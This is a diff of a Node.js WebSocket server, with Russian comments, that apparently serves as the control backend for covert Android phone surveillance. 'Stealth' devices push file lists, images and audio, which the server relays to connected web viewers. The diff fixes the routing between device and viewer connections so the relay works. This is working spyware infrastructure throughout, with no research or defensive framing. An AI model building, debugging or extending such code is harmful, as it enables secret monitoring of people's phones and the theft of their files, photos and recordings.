@@ -76,69 +76,14 @@ wss.on("connection", (ws, req) => {
 
   let deviceId = url.searchParams.get("deviceId");
   
-  if (!deviceId && pathname.startsWith("/ws/stealth/")) {
-    const parts = pathname.split("/");
-    deviceId = parts[parts.length - 1];
-  }
-
-  if (deviceId && deviceId !== "live") {
-    ws.deviceId = deviceId;
-    stealthConnections.set(deviceId, { ws, lastSeen: Date.now(), files: [] });
-    console.log(`Device ${deviceId} connected`);
-
-    ws.on("message", (rawData) => {
-      try {
-        const dataStr = rawData.toString();
-        const msg = JSON.parse(dataStr);
-        
-        if (msg.type === 'ping') {
-          console.log(`Ping from ${deviceId}`);
-          return;
-        }
-        
-        if (msg.type === 'file_list') {
-          const deviceInfo = stealthConnections.get(deviceId);
-          if (deviceInfo) {
-            deviceInfo.files = msg.files;
-            deviceInfo.lastFileUpdate = Date.now();
-          }
-          console.log(`Received ${msg.files.length} files from ${deviceId}`);
-        }
-        
-        // ДОБАВЬТЕ ЭТИ СТРОКИ:
-        if (msg.type === 'image' || msg.type === 'audio') {
-          console.log(`Broadcasting ${msg.type} from ${deviceId} to web clients`);
-        }
-        
-        const broadcast = {
-          type: msg.type || "message",
-          deviceId: deviceId,
-          data: msg.data,
-          timestamp: msg.timestamp || Date.now(),
-          files: msg.files
-        };
-        
-        broadcastToWebClients(broadcast); // <-- ЭТО ДОЛЖНО ВЫЗЫВАТЬСЯ!
-        console.log(`Message from ${deviceId}: ${msg.type}`);
-        
-      } catch (err) {
-        console.error(`Error from device ${deviceId}:`, err);
-      }
-    });
-
-    ws.on("close", () => {
-      stealthConnections.delete(deviceId);
-      console.log(`Device ${deviceId} disconnected`);
-    });
-
-    ws.on("error", (err) => {
-      console.error(`Device WebSocket error (${deviceId}):`, err);
-    });
-
-  } else {
-    // Это веб-клиент
+  // ИСПРАВЬТЕ ЭТУ ПРОВЕРКУ:
+  // Если URL содержит /ws/live - это ВЕБ-КЛИЕНТ для просмотра устройства
+  // Если /ws/stealth - это само устройство Android
+  
+  if (pathname.startsWith("/ws/live")) {
+    // ЭТО ВЕБ-КЛИЕНТ
     webClients.add(ws);
-    console.log(`Web client connected. Total: ${webClients.size}`);
+    console.log(`Web client connected for device ${deviceId}. Total web clients: ${webClients.size}`);
 
     ws.on("message", (rawData) => {
       try {
@@ -163,6 +108,65 @@ wss.on("connection", (ws, req) => {
     ws.on("error", (err) => {
       console.error("Web client WebSocket error:", err);
     });
+    
+  } else if (deviceId && pathname.startsWith("/ws/stealth")) {
+    // ЭТО ANDROID УСТРОЙСТВО
+    ws.deviceId = deviceId;
+    stealthConnections.set(deviceId, { ws, lastSeen: Date.now(), files: [] });
+    console.log(`Device ${deviceId} connected`);
+
+    ws.on("message", (rawData) => {
+      try {
+        const dataStr = rawData.toString();
+        const msg = JSON.parse(dataStr);
+        
+        if (msg.type === 'ping') {
+          console.log(`Ping from ${deviceId}`);
+          return;
+        }
+        
+        if (msg.type === 'file_list') {
+          const deviceInfo = stealthConnections.get(deviceId);
+          if (deviceInfo) {
+            deviceInfo.files = msg.files;
+            deviceInfo.lastFileUpdate = Date.now();
+          }
+          console.log(`Received ${msg.files.length} files from ${deviceId}`);
+        }
+        
+        if (msg.type === 'image' || msg.type === 'audio') {
+          console.log(`Broadcasting ${msg.type} from ${deviceId} to ${webClients.size} web clients`);
+        }
+        
+        const broadcast = {
+          type: msg.type || "message",
+          deviceId: deviceId,
+          data: msg.data,
+          timestamp: msg.timestamp || Date.now(),
+          files: msg.files
+        };
+        
+        broadcastToWebClients(broadcast);
+        console.log(`Message from ${deviceId}: ${msg.type}`);
+        
+      } catch (err) {
+        console.error(`Error from device ${deviceId}:`, err);
+      }
+    });
+
+    ws.on("close", () => {
+      stealthConnections.delete(deviceId);
+      console.log(`Device ${deviceId} disconnected`);
+    });
+
+    ws.on("error", (err) => {
+      console.error(`Device WebSocket error (${deviceId}):`, err);
+    });
+    
+  } else {
+    // Неизвестное подключение
+    console.log(`Unknown WebSocket connection from ${pathname}`);
+    ws.close();
   }
 });
 
@@ -425,4 +429,5 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
